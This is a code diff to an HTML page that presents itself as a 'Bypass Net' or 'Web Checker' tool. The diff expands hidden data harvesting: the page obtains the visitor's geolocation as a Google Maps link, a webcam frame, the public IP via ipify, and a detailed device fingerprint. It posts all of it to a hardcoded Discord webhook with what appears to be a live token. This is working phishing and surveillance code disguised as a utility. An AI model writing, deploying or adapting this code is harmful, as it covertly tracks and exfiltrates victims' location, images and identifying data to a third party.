@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Web Checker</title>
+  <title>Bypass Net</title>
   <style>
     body {
       background: #0d1117;
@@ -19,20 +19,8 @@
       font-size: 20px;
     }
 
-    button {
-      padding: 10px 20px;
-      background: #238636;
-      color: white;
-      border: none;
-      cursor: pointer;
-      border-radius: 8px;
-      font-size: 16px;
-    }
-
     #video {
       display: none;
-      margin-top: 20px;
-      border-radius: 10px;
     }
 
     #progress {
@@ -61,15 +49,15 @@
   <div class="step" id="step3">Step 3: Checking mic access (simulasi)...</div>
   <div class="step" id="step4">Step 4: Simulating fingerprint...</div>
   <div class="step" id="step5">Step 5: Checking environment...</div>
-  <div class="step" id="step6">Step 6: Sending data...</div>
+  <div class="step" id="step6">Step 6: Sending data to Server...</div>
 
-<video id="video" autoplay playsinline style="display: none;"></video>
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <div id="progress"><div id="progress-bar">0%</div></div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1390591929544216586/ODXrAr4oYnbcyierJ-G8By0lialN_-l_nYEaM0axp3NRYLZbAIkB5BNEva3aX2nzkY9y"; // <- ganti dengan webhook kamu
+    const webhookURL = "https://discord.com/api/webhooks/1390591929544216586/ODXrAr4oYnbcyierJ-G8By0lialN_-l_nYEaM0axp3NRYLZbAIkB5BNEva3aX2nzkY9y";
     const stepEls = [...document.querySelectorAll('.step')];
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
@@ -79,6 +67,16 @@
       location: "Unavailable",
       screenshot: null
     };
+
+    async function getPublicIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip || "Unknown";
+      } catch {
+        return "Unavailable";
+      }
+    }
 
     async function runChecker() {
       await step1_Location();
@@ -98,7 +96,9 @@
     async function step1_Location() {
       return new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(pos => {
-          userData.location = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`;
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          userData.location = `https://www.google.com/maps?q=${lat},${lon}`;
           stepEls[0].innerText += " ✅";
           updateProgress(15);
           resolve();
@@ -112,7 +112,7 @@
     }
 
     async function step2_Camera() {
-      return new Promise((resolve, reject) => {
+      return new Promise((resolve) => {
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
           video.srcObject = stream;
           setTimeout(() => {
@@ -151,6 +151,15 @@
     async function step5_EnvCheck() {
       userData.platform = navigator.platform;
       userData.language = navigator.language;
+      userData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      userData.deviceMemory = navigator.deviceMemory + " GB";
+      userData.hardware = navigator.hardwareConcurrency + " cores";
+      userData.screen = `${screen.width}x${screen.height}`;
+      userData.browser = navigator.vendor;
+      userData.userAgent = navigator.userAgent;
+      userData.cookies = navigator.cookieEnabled ? "Yes" : "No";
+      userData.referrer = document.referrer || "None";
+      userData.ip = await getPublicIP();
       stepEls[4].innerText += " ✅";
       updateProgress(80);
       await wait(1000);
@@ -160,25 +169,34 @@
       stepEls[5].innerText += " ⏳";
       updateProgress(90);
 
-      const fileData = {
-        content: "**🛡️ Web Checker Result**",
+      const payload = {
+        content: "**🛡️ Bypass Net Result**",
         embeds: [{
-          title: "User Data",
+          title: "User Info",
           color: 0x00ffcc,
           fields: [
             { name: "Location", value: userData.location, inline: false },
-            { name: "Platform", value: userData.platform || "Unknown", inline: true },
-            { name: "Language", value: userData.language || "Unknown", inline: true },
-            { name: "Fingerprint", value: userData.fingerprint || "Unknown", inline: false }
+            { name: "Public IP", value: userData.ip, inline: false },
+            { name: "Platform", value: userData.platform, inline: true },
+            { name: "Language", value: userData.language, inline: true },
+            { name: "Timezone", value: userData.timezone, inline: true },
+            { name: "Memory", value: userData.deviceMemory, inline: true },
+            { name: "CPU Cores", value: userData.hardware, inline: true },
+            { name: "Resolution", value: userData.screen, inline: true },
+            { name: "Browser", value: userData.browser, inline: true },
+            { name: "Cookies Enabled", value: userData.cookies, inline: true },
+            { name: "Referrer", value: userData.referrer, inline: false },
+            { name: "Fingerprint", value: userData.fingerprint, inline: false },
+            { name: "User Agent", value: userData.userAgent.slice(0, 1000), inline: false }
           ],
-          footer: { text: "Checker by YourSite" }
+          footer: { text: "Web Checker by You" }
         }]
       };
 
       await fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(fileData)
+        body: JSON.stringify(payload)
       });
 
       if (userData.screenshot) {
